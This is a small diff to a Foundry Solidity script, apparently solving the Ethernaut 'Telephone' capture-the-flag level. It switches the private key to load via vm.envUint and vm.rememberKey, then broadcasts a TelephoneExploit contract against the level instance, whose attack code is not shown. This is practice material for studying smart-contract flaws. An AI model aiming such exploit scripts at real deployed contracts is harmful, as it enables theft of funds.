@@ -12,11 +12,12 @@ contract Exploit is Script {
         Telephone level = Telephone(instance); 
         TelephoneExploit public exploit;
         address instance = vm.envAddress("INSTANCE_LEVEL4");
-        address hacker = vm.envAddress("PRIVATE_KEY");
+        uint256 hacker = vm.envUint("PRIVATE_KEY");   
+        address deployer = vm.rememberKey(hacker);
         
         function run() external {
 
-            vm.startBroadcast(hacker);
+            vm.startBroadcast(deployer);
             exploit = new TelephoneExploit();
             exploit.run(level);
             vm.stopBroadcast();
